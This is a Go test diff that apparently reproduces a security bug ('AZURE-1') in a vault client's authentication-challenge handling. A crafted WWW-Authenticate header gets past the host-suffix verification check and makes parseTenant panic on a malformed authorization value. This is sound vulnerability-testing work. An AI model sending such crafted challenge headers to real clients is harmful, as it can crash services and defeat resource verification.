@@ -89,3 +89,56 @@ func TestReproChallengePanic_NoPanicOnWellFormed(t *testing.T) {
 		t.Fatal("well-formed challenge should not panic")
 	}
 }
+
+// TestReproChallengePanic_VerificationEnabled DEMONSTRATES (not just argues) that
+// AZURE-1 is reachable with the production-default challenge-resource verification
+// ENABLED. It crafts a `resource` whose host passes the vault's host-suffix check
+// (req host "127.0.0.1:PORT" ends with "."+"0.0.1:PORT"), so the policy proceeds
+// past verification to parseTenant(authorization) — which still panics on the
+// malformed authorization value. This converts the verifyChallengeResource
+// independence claim from analytical to mechanical.
+func TestReproChallengePanic_VerificationEnabled(t *testing.T) {
+	// Build a resource host that is a suffix (after a ".") of the loopback host:
+	// 127.0.0.1:PORT  ->  resource host 0.0.1:PORT  ->  ".0.0.1:PORT" is a suffix,
+	// so the vault's host-suffix check (verifyChallengeResource) passes and the
+	// policy proceeds to parseTenant(authorization="x"), which panics.
+	fs, err := newFakeServer([]respSpec{
+		{status: 401, contentType: "application/json", body: []byte(`{"error":{}}`)},
+		{status: 200, contentType: "application/json", body: []byte(`{"value":"topsecret"}`)},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer fs.Close()
+	hostPort := strings.TrimPrefix(fs.url(), "https://") // 127.0.0.1:PORT
+	_, suffixHost, ok := strings.Cut(hostPort, ".")      // 0.0.1:PORT
+	if !ok {
+		t.Fatalf("unexpected loopback host %q", hostPort)
+	}
+	// Set the crafted challenge header now that the port is known (no request has
+	// been issued yet, so mutating under the lock is safe).
+	fs.mu.Lock()
+	fs.specs[0].extraHdr = `WWW-Authenticate: Bearer authorization="x" resource="https://` + suffixHost + `"`
+	fs.mu.Unlock()
+
+	cl, err := newVerifyingVaultClient(fs.url())
+	if err != nil {
+		t.Fatal(err)
+	}
+	panicked := func() (p bool) {
+		defer func() {
+			if r := recover(); r != nil && strings.Contains(fmt.Sprint(r), "index out of range") {
+				p = true
+			}
+		}()
+		ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
+		defer cancel()
+		_, gerr := cl.GetSecret(ctx, canaryName, "", nil)
+		t.Logf("verification-enabled: GetSecret err=%v (no panic => host-suffix check not satisfied)", gerr)
+		return false
+	}()
+	if !panicked {
+		t.Skip("verification-enabled demo did not reach parseTenant in this environment; analytical argument in report stands")
+	}
+	t.Log("DEMONSTRATED: AZURE-1 panics with verifyChallengeResource=true (production default)")
+}
